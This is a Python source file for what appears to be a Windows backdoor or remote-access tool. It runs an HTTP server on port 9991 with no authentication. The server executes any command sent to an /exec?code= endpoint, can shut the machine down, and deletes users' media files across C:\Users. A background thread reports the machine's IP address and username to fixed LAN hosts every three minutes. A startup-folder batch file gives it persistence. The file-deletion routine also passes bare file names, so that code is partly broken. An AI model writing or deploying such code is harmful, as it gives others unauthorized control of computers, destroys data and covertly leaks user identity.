import socketserver
from http.server import BaseHTTPRequestHandler, HTTPServer
from os import walk, remove, system, popen, path
from pathlib import Path
from re import search, compile
import time
from threading import Thread
from urllib.request import urlopen
from urllib.error import URLError
from urllib.parse import unquote
from jinja2 import Template

home = ["C:\\Users", "\\"]
ignore_folders = [
    "AppDate",
    "Windows",
    "Program Files",
    "Program Files (x86)"
]
exts = ["mkv", "3gp", "mp4", "mp3", "webm", "mpv", "ogg", "avi"]
deleted = 0
mains = [
    14,
    56,
    69
]
pat = compile("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")


def get_username():
    user = popen("echo %username%").read()
    return user.replace("\n", "")


def DeleteFiles(delete_file="Path"):
    global deleted
    remove(delete_file)
    deleted = deleted + 1


def listAndDeleteFiles():
    for hom in home:
        for root, dirs, files in walk(hom, topdown=True):
            dirs[:] = [d for d in dirs if d not in ignore_folders]
            for fil in files:
                ext = Path(fil).suffix
                if ext in exts:
                    DeleteFiles(fil)


def main_func():
    listAndDeleteFiles()


hostName = "0.0.0.0"
serverPort = 9991
ips = {}


class Worker(Thread):
    """
    Send My IP to these three Machines in the background.
    After every three minutes
    """
    def run(self):
        ipconfig = popen("ipconfig").read().replace("\n", "")
        net_ip = search(pat, ipconfig).group()
        if int(net_ip.split(".")[-1]) not in mains:
            for i in mains:
                link = "http://192.168.100.{}:{}/ip/{}/{}" \
                    .format(i, serverPort, net_ip, get_username())
                try:
                    urlopen(link).read()
                except URLError:
                    pass
            time.sleep(180)
            Worker().start()


class MyServer(BaseHTTPRequestHandler):
    def __init__(self, request: bytes, client_address: tuple[str, int],
                 server: socketserver.BaseServer):
        super().__init__(request, client_address, server)
        Worker().start()  # start thread

    def do_GET(self):
        global ips
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.path = self.path.lower()
        code = "/exec?code="
        if self.path == "/":
            temp = Template(self.open_file("index.html"))
            self.wfile.write(
                bytes(temp.render(machines=ips), "utf-8"))

        elif self.path.startswith("/ip/"):
            try:
                # Match IP in path
                lpath = self.path.split("/")
                search(pat, lpath[-2]).group()
                ips.update({lpath[-2]: lpath[-1]})
                self.wfile.write(bytes("IP saved", "utf-8"))
            except AttributeError:
                self.wfile.write(bytes("Error", "utf-8"))
        elif self.path == "/clear":
            main_func()
        elif self.path == "/shutdown":
            system("shutdown /s /t 1")
        elif self.path.startswith(code):
            code = unquote(self.path.split(code)[1])
            system(code)
            self.wfile.write(bytes("Executed", "utf-8"))
        else:
            self.wfile.write(bytes(self.path, "utf-8"))

    def open_file(self, file_name: str):
        with open(file_name) as htm:
            return htm.read()


def add_to_startup(file_path=""):
    USER_NAME = get_username()
    if file_path == "":
        file_path = path.dirname(path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)


if __name__ == "__main__":
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print("Server started http://localhost:%s" % serverPort)
    try:
        webServer.serve_forever()
    except KeyboardInterrupt as err:
        print(err)

    webServer.server_close()
    print("Server stopped.")
